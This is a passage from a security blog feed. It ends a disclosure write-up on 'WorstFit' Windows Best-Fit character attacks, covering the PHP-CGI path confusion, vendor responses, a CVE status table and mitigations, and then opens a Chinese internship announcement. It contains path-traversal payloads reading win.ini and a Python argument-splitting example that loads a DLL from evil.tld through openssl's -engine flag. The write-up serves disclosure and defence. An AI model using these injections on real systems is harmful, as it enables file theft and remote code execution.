  &lt;li&gt;&lt;strong&gt;Web Serverâ€™s Perspective&lt;/strong&gt;: The server treats the entire &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/..Â¥..Â¥windows/win.ini/foo&lt;/code&gt; as additional &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; and processes it as part of the request.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;PHP-CGIâ€™s Perspective&lt;/strong&gt;: PHP-CGI receives things like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;REQUEST_URI=/index.php/..\..\windows/win.ini/foo&lt;/code&gt; and struggles to differentiate between the actual PHP file (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt;) and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; portion. This confusion allows the exploit to manipulate the behavior and access files beyond intended restrictions.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This mismatch between how components interpret the request opens the door to potential vulnerabilities. Depending on the web serverâ€™s behavior and configuration, this can turn into a file existence oracle on &lt;strong&gt;Apache&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Non-existing file&lt;/strong&gt;: For a request like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php/..Â¥..Â¥NONEXIST/&lt;/code&gt;, PHP-CGI treats &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/..Â¥..Â¥NONEXIST/&lt;/code&gt; as additional &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; and renders &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php&lt;/code&gt; as usual.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Existing file&lt;/strong&gt;: For a request like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php/..Â¥..Â¥windows/win.ini/&lt;/code&gt;, PHP-CGI fails and produces a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;No input file specified&lt;/code&gt; error due to how it handles valid files internally.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;But why stop at just checking file existence? On an &lt;strong&gt;IIS server&lt;/strong&gt; with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doc_root&lt;/code&gt; directive configured, this can lead to &lt;strong&gt;Local File Inclusion (LFI)&lt;/strong&gt;. Using a path like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php/..Â¥..Â¥..Â¥windows/win.ini/&lt;/code&gt;, you can effectively include and read arbitrary files, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\win.ini&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As an LFI vulnerability, this can surely escalate to a potential &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt; in scenarios where the included file contains executable or user-controllable code.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: This specific scenario is rare in real-world applications, so we classify it more as a bug rather than a vulnerability.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-duskor-dawnof-the-worstfit&quot;&gt;The Duskâ€“or Dawnâ€“of the WorstFit&lt;/h2&gt;

&lt;p&gt;As mentioned earlier, we have identified several issues across programming languages, open-source projects, and Windows built-in command-line programs. As responsible researchers, we promptly reported these issues to their respective upstream maintainers. However, this process was quite challenging, the most debated topic is revolved around the &lt;strong&gt;Argument Splitting&lt;/strong&gt;, and this section highlights some obstacles we encountered during the reporting process.&lt;/p&gt;

&lt;h4 id=&quot;-is-this-an-issue&quot;&gt;ğŸ§ &lt;strong&gt;Is this an issue?&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;This was the most common question raised by vendors. Those in opposition argued that â€œpassing user inputs to the command line in itself is already a vulnerabilityâ€. Even they are properly escaped or have sanitization in place, the root of the problem is still that â€œdevelopers should avoid such practices altogetherâ€.&lt;/p&gt;

&lt;p&gt;I am not sure if itâ€™s fair to shift all the responsibility onto developers. Firstly, the operating system itself is already a scenario that highly requires user inputs. Additionally, with the increasing complexity of web applications, it is really difficult to completely eliminate user input.&lt;/p&gt;

&lt;h4 id=&quot;-who-is-responsible-for-that&quot;&gt;ğŸ§ &lt;strong&gt;Who is responsible for that?&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Even if we both agree that this is an issue, the next much challenging question is: â€œWho is responsible for it?â€ Since the problematic code is embedded automatically during compilation (the compiler attaches the entry &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mainCRTStartup()&lt;/code&gt;, which calls the ANSI API within MSVCRT/UCRT), the responsibility becomes unclear. Is it because &lt;strong&gt;â€œthe developer failed to use the correct &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wmain()&lt;/code&gt;â€&lt;/strong&gt;, or is it &lt;strong&gt;â€œCRTâ€™s failure for not splitting the command line well and pass the wrong argument to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main()&lt;/code&gt;â€&lt;/strong&gt;?&lt;/p&gt;

&lt;p&gt;To make things even more confusing, some projects only provide source code, leaving the prebuilt executable files distributed to be handled by third-party volunteers across the Internet. In such cases, who should be held accountable for the issue? Taking it a step further, could this even be considered a case of &lt;a href=&quot;https://en.wikipedia.org/wiki/Backdoor_(computing)#Compiler_backdoors&quot;&gt;compiler-introduced security vulnerabilities&lt;/a&gt;? ğŸ˜‰&lt;/p&gt;

&lt;h4 id=&quot;-its-really-hard-to-fix-it&quot;&gt;ğŸ˜– &lt;strong&gt;Itâ€™s really hard to fix it!&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;I believe most maintainers would be willing to help with a quick fix, even if it wasnâ€™t categorized as a security issue. However, resolving this problem isnâ€™t that as simple as just replacing the &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main()&lt;/code&gt;&lt;/strong&gt; with its wide-character counterpart. Since the function signature has been changed, maintainers would need to rewrite all variable definitions and argument parsing logics, converting everything from simple &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char *&lt;/code&gt;&lt;/strong&gt; to &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wchar_t *&lt;/code&gt;&lt;/strong&gt;. This process can be painful and error-prone. ğŸ˜µâ€ğŸ’«&lt;/p&gt;

&lt;p&gt;We have also summarized some responses we received as follows:&lt;/p&gt;

&lt;h4 id=&quot;-curl&quot;&gt;â¤ Curl&lt;/h4&gt;

&lt;p&gt;Curl said that this is a Windows feature and there are no plans to fix it. Interestingly, Microsoftâ€™s &lt;a href=&quot;https://curl.se/windows/microsoft.html&quot;&gt;ported Curl&lt;/a&gt; has properly modified the entry to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wmain()&lt;/code&gt; on the contrary, so the built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl.exe&lt;/code&gt; on Windows is not impacted, only the binaries delivered by official  Curl are affected by the Argument Splitting attack.&lt;/p&gt;

&lt;p&gt;Here are some responses from Curl. You can check the full report on &lt;a href=&quot;https://hackerone.com/reports/2550951&quot;&gt;HackerOne&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Iâ€™m struggling to see how this is a curl problem. It looks like a Windows â€œfeatureâ€ to me. It is being â€œhelpfulâ€ and helps users to convert ascii-looking double quotes to ASCII double quotes.&lt;/p&gt;

  &lt;p&gt;â€” ğŸ‘¤ Author of Curl&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;If we can mitigate this we should probably consider that, but it is a hard problem and it certainly is not going to be solved in the short term. curl is a victim here, not the responsible party.&lt;/p&gt;

  &lt;p&gt;â€” ğŸ‘¤ Author of Curl&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;-openssl&quot;&gt;â¤ OpenSSL&lt;/h4&gt;

&lt;p&gt;This is an interesting case. OpenSSL provides an environment variable, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OPENSSL_WIN32_UTF8&lt;/code&gt;, to handle arguments in Wide Character format. Although its original purpose was to correct issues with displaying UTF-8 in the UI, it also mitigates the Argument Splitting attack unintentionally!&lt;/p&gt;

&lt;p&gt;However, most developers are still unaware of the need to set this environment variable while using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openssl.exe&lt;/code&gt; executable. As a result,it is still possible to leverage the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-engine&lt;/code&gt; argument to execute arbitrary code in a default OpenSSL usage.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;passphrase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;pass&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\uFF02&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\uFF02&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-engine&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\uFF02&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\uFF02\\\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;evil.tld&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;malicious.dll&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&apos;openssl.exe&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&quot;enc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&quot;-aes-256-cbc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&quot;-in&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;in.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&quot;-out&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;out.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&quot;-k&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passphrase&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;-perl&quot;&gt;â¤ Perl&lt;/h4&gt;

&lt;p&gt;The official Perl did not provide prebuilt executables for Windows. Instead, third-party installers such as &lt;a href=&quot;https://strawberryperl.com/&quot;&gt;Strawberry Perl&lt;/a&gt; or &lt;a href=&quot;https://www.activestate.com/products/perl/&quot;&gt;ActiveState Perl&lt;/a&gt; are commonly used, and both of which are affected by the Argument Splitting attack. After having a discuss with the Perl maintainer, they concluded that &lt;strong&gt;â€œThis seems more like a Microsoft bug than a Perl bug,â€&lt;/strong&gt; so this issue remains unresolved in Perl for now.&lt;/p&gt;

&lt;h4 id=&quot;-microsoft&quot;&gt;â¤ Microsoft&lt;/h4&gt;

&lt;p&gt;We reported three cases to MSRC in total, but the communication process did not go well. All cases were initially rejected for not meeting their severity criteria. We re-opened the case several times and the Excel case was eventually accepted after our third attempt, while the other cases remain unresolved for today :(&lt;/p&gt;

&lt;p&gt;Here is the reply:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The attack scenario here depends on a vulnerability in an unrelated application. The trick inherently requires a separate application that inserts untrusted input into a command line which is then executed. That in itself is a vulnerability; however, the technique which makes exploiting the issue possible does not qualify as a vulnerability.
â€” ğŸ‘¤ MSRC&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;-report-to-certcc&quot;&gt;â¤ Report to CERT/CC&lt;/h4&gt;

&lt;p&gt;Since this is a systemic problem, we have also sought assistance from CERT/CC, hoping to coordinate and collaborate in an effort to find a better solution to address this issue. Microsoft eventually added one more &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea#security-remarks&quot;&gt;warning&lt;/a&gt; in their documentation after several months of effort. However, they only put this warning in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt;. There are still several ANSI APIs that need attention! Â¯\_(ãƒ„)_/Â¯&lt;/p&gt;

&lt;p&gt;During the process of the vulnerability disclosure, we also investigated the open-source ecosystem to identify more affected applications, and tried to report them to their maintainers. Here is a list of what we have reported so far:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Report Date&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Vendor&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Status&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/05/07&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;PHP - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv&quot;&gt;CVE-2024-4577&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/13&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Curl - &lt;a href=&quot;https://curl.se/windows/&quot;&gt;Official Build&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://hackerone.com/reports/2550951&quot;&gt;Wonâ€™t Fix&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/13&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Apache Subversion - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svn.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/cve-2024-45720&quot;&gt;CVE-2024-45720&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/16&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Microsoft Tar - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Wonâ€™t Fix&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Microsoft Excel - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;excel.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49026&quot;&gt;CVE-2024-49026&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Microsoft PhoneBook - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rasphone.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Wonâ€™t Fix&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Oracle Java - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Pending Fix&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Perl - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Wonâ€™t Fix&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/07/15&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Perforce - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p4.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2024-8067&quot;&gt;CVE-2024-8067&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/08/05&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;PostgreSQL - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psql.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Wonâ€™t Fix&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/08/08&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Putty - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plink.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Fixed&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/08/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OpenSSL - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openssl.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Other&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/08/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;wkhtmltopdf - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wkhtmltopdf.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;EOL&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/08/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;GNU Wget&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No Reply&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h2&gt;

&lt;p&gt;So far, we have summarized attacks on WorstFit, including &lt;strong&gt;Filename Smuggling&lt;/strong&gt;, &lt;strong&gt;Argument Splitting&lt;/strong&gt;, and &lt;strong&gt;Environment Variable Confusion&lt;/strong&gt;. Each attack has its applicable Code Pages. You can check the following table to see if you are at risk or not.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;â†“ Table of Affected Code Pages:&lt;/em&gt;
&lt;img src=&quot;/assets/img/blog/20250109/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;â†“ World Map of WorstFit:&lt;/em&gt;
&lt;img src=&quot;/assets/img/blog/20250109/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;mitigations&quot;&gt;Mitigations&lt;/h3&gt;

&lt;p&gt;As for how to mitigate such attacks, unfortunately, since this is an operating system-level problem, similar issues will continue to reappear â€” until Microsoft chooses to enable UTF-8 by default in all of their Windows editions. Before that, the only thing we can do is to encourage everyone, the users, organizations, and developers, to gradually phase out ANSI and promote the use of the Wide Character API, transiting the environment to a safer world step by step!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;As a user&lt;/strong&gt;, the only thing you can do is to check the UTF-8 option on your Windows. However, since this feature is still in the BETA phase, itâ€™s uncertain whether it will cause side effects or not.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;As a developer&lt;/strong&gt;, please use the Wide Character API as much as possible. As well as the C Runtime Library, they also provide the wide character versions, such as &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd-wgetcwd?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_wgetcwd&lt;/code&gt;&lt;/a&gt; and &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_wgetenv&lt;/code&gt;&lt;/a&gt;. Otherwise, the underlying implementation can still call the ANSI API, which is vulnerable to our WorstFit attacks, too!&lt;/p&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;We hope this article provides you with an overview and enough insights to understand WorstFit Attack. Of course, this is not the end. Considering Windowsâ€™ commitment towards backward compatibility, you can imagine there are more hidden places the ANSI API would appear, for example, the Windows Registry queries like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RegQueryValueA&lt;/code&gt; are definitely affected but need to find a vulnerable scenario, and we also observed Best-Fit behavior in Active Directory! ğŸ˜‰&lt;/p&gt;

&lt;p&gt;We encourage more researchers to explore this attack surface and look forward to see more vulnerabilities in the future!&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2025/01/09/worstfit-unveiling-hidden-transformers-in-windows-ansi/</link>
                <guid>https://devco.re/blog/2025/01/09/worstfit-unveiling-hidden-transformers-in-windows-ansi</guid>
                <pubDate>Thu, 09 Jan 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2025 ç¬¬ä¸ƒå±†å¯¦ç¿’ç”Ÿè¨ˆç•«</title>
                <description>&lt;p&gt;DEVCORE å‰µç«‹è¿„ä»Šå·²é€¾åå¹´ï¼ŒæŒçºŒå°ˆæ³¨æ–¼æä¾›ä¸»å‹•å¼è³‡å®‰æœå‹™ï¼Œä¸¦è‡´åŠ›å°‹æ‰¾å„ç¨®å®‰å…¨é¢¨éšªåŠæ¼æ´ï¼Œè®“ä¸–ç•Œè®Šå¾—æ›´å®‰å…¨ã€‚ç‚ºäº†æŒçºŒå°‹æ‰¾æ›´å¤šæ“æœ‰ç›¸åŒç†å¿µçš„è³‡å®‰æ–°éŠ³ã€å”åŠ©å­¸ç”Ÿå»ºæ§‹æ­£ç¢ºè³‡å®‰æ„è­˜åŠæŠ€èƒ½ï¼Œæˆ‘å€‘æˆç«‹äº†ã€Œæˆ´å¤«å¯‡çˆ¾å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘ã€ï¼Œäº¦æ–¼ 2022 å¹´åˆèˆ‰è¾¦é¦–å±†å¯¦ç¿’ç”Ÿè¨ˆç•«ï¼Œç›®å‰ç‚ºæ­¢æˆæœé —è±ã€è¶…ä¹é æœŸã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¾ˆæ¦®å¹¸åœ°å®£ä½ˆï¼Œç¬¬ä¸ƒå±†å¯¦ç¿’ç”Ÿè¨ˆç•«å°‡æ–¼ 2025 ä¸‰æœˆç™»å ´ï¼Œå³æ—¥èµ·æ­£å¼é–‹æ”¾å ±åï¼ç‚ºäº†è®“åŒå­¸å€‘æœ‰æ›´å……è£•çš„æº–å‚™æ™‚é–“ä¸¦ç²å¾—æ›´å¥½çš„å¯¦ç¿’é«”é©—ï¼Œæœ¬å±†åœ¨æ™‚ç¨‹ä¸Šåšäº†ä¸€äº›èª¿æ•´ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;å»¶é•·å ±åæ™‚é–“ï¼Œä¸¦æ¡å–æ›´å½ˆæ€§çš„ç”³è«‹æ–¹å¼ï¼Œè®“åŒå­¸èƒ½å……åˆ†å±•ç¾è‡ªèº«å¯¦åŠ›&lt;/li&gt;
  &lt;li&gt;ææ—©å…¬å¸ƒçµæœï¼Œè®“åŒå­¸æ›´éˆæ´»åœ°è¦åŠƒå¾ŒçºŒè¡Œç¨‹&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ­¤å¤–ï¼Œæˆ‘å€‘ä¹Ÿå»¶çºŒäº†ä¸Šä¸€å±†çš„åˆ†çµ„æ–¹å¼ï¼Œè®“åŒå­¸å€‘èƒ½æ ¹æ“šèˆˆè¶£èˆ‡å°ˆé•·é¸æ“‡åˆé©çš„çµ„åˆ¥ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Research çµ„ï¼šé©åˆå°æ¼æ´ç ”ç©¶æœ‰èˆˆè¶£ã€æƒ³æŒ–æ˜çœŸå¯¦æ¼æ´çš„åŒå­¸&lt;/li&gt;
  &lt;li&gt;Red Team çµ„ï¼šé©åˆå°ç´…éšŠæŠ€è¡“æœ‰èˆˆè¶£ã€æƒ³ç²¾é€²æ»²é€æŠ€å·§çš„åŒå­¸&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è‹¥æ‚¨æœŸå¾…åŠ å…¥æˆ‘å€‘ã€ç²¾é€²è³‡å®‰æŠ€èƒ½ï¼Œç…©è«‹è©³é–±ä¸‹åˆ—è³‡è¨Šå¾Œå¡«å¯«è¡¨å–®å ±åï¼&lt;/p&gt;

&lt;h3 id=&quot;å¯¦ç¿’å…§å®¹&quot;&gt;å¯¦ç¿’å…§å®¹&lt;/h3&gt;

&lt;p&gt;æœ¬æ¬¡å¯¦ç¿’åˆ†ç‚º Research åŠ Red Team å…©å€‹çµ„åˆ¥ï¼Œä¸»è¦å…§å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Research (Binary/Web)
ä»¥ç ”ç©¶ç‚ºä¸»ï¼Œåœ¨èˆ‡å°å¸«ç¢ºå®šç ”ç©¶æ¨™çš„å¾Œï¼Œåˆ†æç›®æ¨™æ¶æ§‹ã€é€²è¡Œé€†å‘å·¥ç¨‹æˆ–ç¨‹å¼ç¢¼å¯©æŸ¥ã€‚è—‰ç”±é€™å€‹éç¨‹è¨“ç·´è‡ªå·±çš„æ€è·¯ï¼Œæ‰¾å‡ºå¯èƒ½çš„æ”»æ“Šé¢èˆ‡æ½›åœ¨çš„å¼±é»ã€‚å¦å¤–ä¹Ÿæœƒè®“å¤§å®¶å˜—è©¦åˆ†æåŠæ’°å¯«éå¾€æ¼æ´çš„ Exploitï¼Œç†è§£éå»æ¼æ´éƒ½å‡ºç¾åœ¨å“ªï¼Œé«”é©—çœŸå¯¦ä¸–ç•Œçš„æ¼æ´éƒ½æ˜¯å¦‚ä½•åˆ©ç”¨ã€‚
    &lt;ul&gt;
      &lt;li&gt;æ¼æ´æŒ–æ˜åŠç ”ç©¶ 60 %&lt;/li&gt;
      &lt;li&gt;1-day é–‹ç™¼ (Exploitation) 30 %&lt;/li&gt;
      &lt;li&gt;æˆæœå ±å‘Šèˆ‡æº–å‚™ 10 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Red Team
ç ”ç©¶ä¸¦æ·±å…¥å­¸ç¿’ç´…éšŠå¸¸ç”¨æŠ€å·§ï¼Œç†Ÿæ‚‰å¯¦æˆ°ä¸­æœƒé‡åˆ°çš„æƒ…å¢ƒã€èªè¨€èˆ‡æ¶æ§‹ã€‚äº†è§£å¸¸è¦‹æ¼æ´çš„æˆå› ã€å¯¦éš›åˆ©ç”¨æ–¹æ³•ã€åš´è‹›æ¢ä»¶ä¸‹çš„åˆ©ç”¨ç­–ç•¥ã€é»‘ç®±æ¸¬è©¦æ–¹å¼åŠå„ç¨®å¥‡æŠ€æ·«å·§ã€‚å­¸ç¿’å¾Œæ»²é€æ™‚çš„å¸¸è¦‹é™åˆ¶ã€å·¥å…·æ¦‚å¿µèˆ‡åŸç†ã€‚
    &lt;ul&gt;
      &lt;li&gt;æ¼æ´èˆ‡æŠ€å·§çš„ç ”ç©¶åŠæ·±å…¥å­¸ç¿’ 70 %&lt;/li&gt;
      &lt;li&gt;Lab å»ºç½®æˆ– Bug Bounty æˆ–æ¼æ´æŒ–æ˜ 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

